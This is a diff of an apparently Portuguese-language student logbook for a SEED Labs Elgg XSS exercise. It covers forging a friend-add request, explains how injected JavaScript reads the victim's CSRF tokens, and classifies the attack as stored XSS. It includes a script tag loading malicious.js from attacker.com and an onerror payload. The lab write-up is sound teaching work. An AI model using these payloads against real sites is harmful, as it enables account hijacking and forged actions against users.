@@ -75,11 +75,11 @@ __Task 4:__
 
 **Objetivo:** Forjar um pedido HTTP a partir do navegador da vítima para adicionar "Samy" como amigo, sem intervenção do atacante.
 
-**Passos para identificar o pedido legítimo:**
+**Passos**
 
-1. Login como **boby**
+1. Login como **alice**
 2. Abrir **Firefox Developer Tools** → **Network Tab** (ou usar extensão HTTP Header Live)
-3. Visitar o perfil de outro utilizador (ex: charlie) e clicar em **Add friend**
+3. Visitar o perfil de **samy** e clicar em **Add friend**
 4. Observar o pedido HTTP capturado:
    - **Método:** GET
    - **URL:** `http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1763547462&__elgg_token=lxFFQO2GjDz8BjBktleC3Q`
@@ -119,7 +119,69 @@ Boby adiciona automaticamente Samy como amigo sem qualquer ação consciente. Ao
 
 ![image](docs/logbook7/LOGBOOK7(5).png)
 
+---
 
+**Respostas às questões:**
+
+**Question 1: Explain the purpose of Lines ➀ and ➁, why are they needed?**
+
+```javascript
+var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;     // ➀
+var token = "&__elgg_token=" + elgg.security.token.__elgg_token; // ➁
+```
+Estas linhas extraem os **tokens de segurança CSRF** da sessão da vítima.
+
+- **`__elgg_ts`**: Timestamp que valida que o pedido é recente (previne ataques antigos)
+- **`__elgg_token`**: Token que valida que o pedido vem de uma página legítima do Elgg
+
+**Por que são necessários?**
+
+O Elgg exige estes parâmetros em todos os pedidos que alteram dados (adicionar amigo, editar perfil, etc.) como proteção contra ataques CSRF. 
+
+Como o nosso código JavaScript malicioso executa **dentro do domínio do Elgg**, consegue aceder ao objeto `elgg.security.token` que contém os tokens válidos da sessão da vítima. Sem estes tokens, o servidor rejeitaria o pedido.
+
+---
+
+**Question 2: If the Elgg application only provides the Editor mode for the "About Me" field, can you still launch a successful attack?**
+
+**Resposta:**
+
+Sim, mas é mais difícil. Alternativas:
+
+1. **Usar link approach:** Hospedar o JavaScript num servidor externo:
+   ```html
+   <script src="http://attacker.com/malicious.js"></script>
+   ```
+
+2. **Event handlers:** Usar eventos em tags HTML:
+   ```html
+   <img src="x" onerror="alert('XSS')">
+   ```
+
+No entanto, o modo Text é mais confiável porque garante que o código é inserido exatamente como pretendido, sem alterações do editor visual.
 
 
 ## Questão 2
+
+### Modalidades de Ataques XSS
+
+**Em qual modalidade se enquadra este ataque?**
+
+**Resposta: Stored XSS (XSS Persistente)**
+
+**Porquê?**
+
+1. **O código é armazenado no servidor** (base de dados do Elgg)
+2. **Executa automaticamente** quando alguém visita o perfil
+3. **Afeta múltiplos utilizadores** (todos que veem o perfil)
+4. **É permanente** até ser removido
+
+**Diferenças das outras modalidades:**
+
+- **Reflected XSS**: O código vem num link e é refletido imediatamente (não é armazenado). Requer que cada vítima clique num link especial.
+
+- **DOM-based XSS**: A vulnerabilidade está no JavaScript do cliente, não no servidor.
+
+**Conclusão:**
+
+Este é **Stored XSS** porque o código malicioso fica guardado permanentemente no perfil e afeta todos os visitantes. É o tipo mais perigoso de XSS.
